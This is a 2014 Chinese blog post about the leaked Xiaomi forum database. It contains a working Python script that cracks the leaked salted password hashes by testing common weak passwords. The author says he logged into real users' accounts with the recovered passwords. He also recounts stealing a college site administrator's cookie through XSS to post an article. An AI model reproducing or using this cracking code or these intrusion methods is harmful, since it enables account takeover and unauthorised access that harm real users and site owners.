title: 小米被脱裤那点事儿
date: 2014-05-20 0:16:16
tags: [小米,数据库,Web安全,创业]
---

几天前，网络开始疯传小米被脱裤，我是第二天才知道消息的，在[乌云](http://wooyun.org)评论里看到[西域论坛](http://bbs.xiyv.net/)，去看了下竟然有数据库的百度网盘链接，下载后发现是三个文件，分别是xiaomi_com.MYI,xiaomi_com.MYD,xiaomi_com.frm,查了下资料:
>frm、MYI、MYD 分别是 MyISAM 表的表结构\索引\数据文件

花了点时间导入本地数据库。小米论坛之前采用的是Discuz系统，密码都是加盐哈希存储的，很难破解，[CMD5](http://www.cmd5.com/)这个网站挺牛逼的，能反向破解很多密码，但是收费，以为这份数据库没啥价值，也就没怎么管。晚上突然想到即使加盐，也可以去尝试用弱口令比对的方法，即用最常用的123456等弱密码加盐哈希后去和数据库里的值进行比较。第一次用Python写了脚本，的确很方便，之前用Java连接数据库都要弄个驱动。出乎意料的是123456这种密码竟然有30300个用户，能登录成功的都没有开启小米云服务，有些则是登录失败，估计这部分才是云服务用户，被小米锁定账号了，要是提前一天分析出这些密码，估计很多用户隐私就可以看到了。

#代码

Python写了个脚本，进行密码分析，弱口令来源是社会工程学联盟统计的2013年常用弱口令TOP26，互联网上泄露的密码已经数以亿计，我知道不少人手里整理了这些数据，随手查个邮箱用户名的密码轻而易举，很大的几率碰撞能登录其他网站，这他妈才是大数据。下面亮出脚本代码吧，第一次写，纯属现学现用。

```
#!/usr/bin/env python
#coding=utf-8
import sys
import MySQLdb
import MySQLdb.cursors
import re
import md5
import os

pwdList=['123456','123456789','111111','123123','12345678','a123456','000000','5201314','11111111','wodima123','a123456789','zxcvbnm','123456a','123321','qq123456','woaini1314','123456789a','passport','1234567890','1314520','abc123456','123123123','1234567','7758521','666666','woaini']
conn=MySQLdb.connect(host='localhost',user='root',passwd='900608',cursorclass=MySQLdb.cursors.SSCursor)
cursor=conn.cursor()

conn.select_db('xiaomi')
cursor.execute('select * from xiaomi_com')

row=cursor.fetchone()
dict={}

while row is not None:
	password=row[2]
	list=re.split(':',password)
 	md5pwd=list[0]
	salt=''
	if len(list)>1:
		salt=list[1]
	for ipwd in  pwdList:
		m=md5.new(ipwd)
		m.digest()
		m1=md5.new(m.hexdigest()+salt)
		m1.digest()
		pwd=m1.hexdigest()
		if pwd==md5pwd:
			dict[ipwd]=dict.get(ipwd,0)+1
			print row[3],ipwd
			break
	row=cursor.fetchone()
cursor.close()
conn.close()
for i in dict:
	print "dict[%s]="% i,dict[i]
```
下面是代码运行部分结果，统计了26个密码的使用人数，应该有8万左右吧，还是挺多的。

![数据分析结果](http://jiajixin.qiniudn.com/xiaomi_database_ana.png)

#安全

我是从去年开始关注网络安全的，在微博和网络上看了点相关知识。后来一个女同学过生日，想给她一份别致的礼物----在学院官网上祝她生日快乐，看了看网站，感觉有个地方应该可以XSS注入代码，开个服务器等了三天三夜，终于等到管理员上线拿到了她的cookie，发了篇生日快乐的文章，怕出事，很快又改回来了。后来那个女同学送了我块肥皂，更搞笑的是肥皂被我舍友要去，然后不知道送给谁了。

年初的时候，余弦@知道创宇在微信招聘，我顺手发了个简历，很快就收到他的回复，也有空和业内大名鼎鼎的黑哥在QQ上聊了一会，那边基本上是给了开发的offer，由于各种原因没去，但却开始更加关注Web安全。知道创宇的这一票人，在Web安全领域做的还是挺不错的，今年信息安全发生了很多大事，OpenSSL心血漏洞事件、路由器安全、摄像头安全，这些事件背后都能看到他们的身影，这是一群牛逼的人，希望他们越做越好吧。

有人说今年是信息安全元年，行业变化很大，发生了很多事情。这不到一年的时间，我是越来越意识到Web安全的重要性，BAT这样的大公司对安全还是挺重视的，但太多的创业公司意识薄弱，小公司基本不了解Web安全，连小米这样的中型创业公司也被爆料对白帽不友好。大多数都是吃一堑长一智，跌了跟头才开始意识到安全的重要性。不光公司，很多程序员基本上都不了解Web安全，很多学校没有相关课程，有的也是乏味的密码学基础知识介绍，更不要说那些教授纸上谈兵，根本不懂入侵了。希望未来高校能有Web安全这门课，有个牛逼的黑客导师，我觉得很多学生还是有兴趣的，这个可能高校和企业合作比较好。

不想当黑客的程序员不是好程序员，很多人进入计算机行业的时候都有成为黑客这样的想法吧，只是后来渐行渐远。锤子便签的图标上有一句话，
>不要因为走得太远就忘了当初为什么出发

是啊，下周二锤子手机发布会优酷直播，真心期待老罗带来精彩。

